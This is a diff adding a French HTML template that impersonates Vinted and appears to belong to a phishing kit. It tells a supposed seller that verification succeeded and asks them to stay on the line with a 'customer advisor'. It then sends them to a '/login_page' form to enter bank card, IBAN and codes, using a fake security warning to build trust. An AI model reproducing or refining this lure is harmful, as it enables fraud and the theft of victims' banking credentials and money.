@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vinted - Finalisation et Versement des Fonds</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f4f4f4 url('{{ url_for('static', filename='img/background.jpg') }}') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+            overflow-y: auto;
+        }
+        .overlay {
+            background-color: rgba(255, 255, 255, 0.95); /* Légèrement moins transparent */
+            width: 100%;
+            max-width: 700px; /* Plus large pour le texte */
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.15); /* Ombre plus prononcée */
+            text-align: center;
+            margin-top: 40px;
+            margin-bottom: 40px;
+        }
+        .logo {
+            margin-bottom: 25px;
+        }
+        .logo img {
+            max-width: 180px;
+            height: auto;
+            border: 0;
+        }
+        h1 {
+            font-size: 30px;
+            color: #28a745; /* Vert pour le succès */
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 17px;
+            line-height: 1.7;
+            margin-bottom: 20px;
+            color: #444;
+        }
+        .important-text {
+            font-weight: bold;
+            color: #007b76; /* Couleur Vinted pour l'importance */
+        }
+        .conseiller-note {
+            font-weight: bold;
+            color: #555;
+            margin-top: 25px;
+            font-size: 18px;
+        }
+        .danger-box {
+            background-color: #ffebeb; /* Fond rouge très clair */
+            border: 2px solid #dc3545; /* Bordure rouge */
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 30px;
+            margin-bottom: 25px;
+            color: #dc3545; /* Texte rouge */
+            font-weight: bold;
+            text-align: left;
+            font-size: 16px;
+        }
+        .danger-box strong {
+            color: #dc3545;
+        }
+        .danger-box ul {
+            margin-top: 10px;
+            padding-left: 25px;
+            list-style: none; /* Supprimer les puces par défaut */
+        }
+        .danger-box ul li:before {
+            content: "• "; /* Ajouter une puce personnalisée */
+            color: #dc3545;
+            font-weight: bold;
+            display: inline-block;
+            width: 1em;
+            margin-left: -1em;
+        }
+        .button {
+            display: inline-block;
+            padding: 15px 35px;
+            font-size: 18px;
+            color: #ffffff;
+            background-color: #007b76;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+        .button:hover {
+            background-color: #00605c;
+        }
+        footer {
+            text-align: center;
+            padding: 20px 0;
+            color: #777;
+            font-size: 12px;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        @media (max-width: 768px) {
+            .overlay {
+                margin: 20px 15px;
+                padding: 20px;
+            }
+            h1 {
+                font-size: 26px;
+            }
+            p {
+                font-size: 15px;
+            }
+            .button {
+                padding: 12px 25px;
+                font-size: 16px;
+            }
+            .danger-box {
+                padding: 15px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted">
+        </div>
+        <h1>Félicitations ! Votre vérification a été un succès !</h1>
+        <p>
+            <span class="important-text">Votre bordereau d'envoi est désormais valable pendant 5 jours ouvrables.</span> Vous pouvez déposer votre colis dans le point relais de votre choix dès maintenant.
+        </p>
+        <p>
+            Afin de procéder au versement de vos fonds et d'enregistrer votre compte bancaire pour un <span class="important-text">transfert instantané de vos gains Vinted</span>, nous avons besoin de vos dernières informations.
+        </p>
+        <p class="conseiller-note">
+            Veuillez rester en ligne avec votre conseiller client : nous allons finaliser ensemble l'enregistrement et le versement de vos fonds.
+        </p>
+
+        <div class="danger-box">
+            <p><strong>⚠️ ATTENTION IMPORTANTE POUR VOTRE SÉCURITÉ ⚠️</strong></p>
+            <ul>
+                <li><strong>Ne mentionnez JAMAIS vos informations personnelles ou bancaires (numéro de carte, IBAN, codes...) oralement,</strong> que ce soit à votre conseiller ou à toute autre personne.</li>
+                <li>Toutes les données nécessaires à l'enregistrement de votre compte bancaire et au versement de vos fonds doivent être saisies **UNIQUEMENT** via le formulaire sécurisé qui va apparaître.</li>
+                <li>Cette procédure est essentielle pour garantir la confidentialité et la protection de vos informations financières.</li>
+            </ul>
+        </div>
+
+        <a href="/login_page" class="button">Accéder au formulaire de versement sécurisé</a>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Vinted - La mode d'occasion, repensée.</p>
+    </footer>
+</body>
+</html>
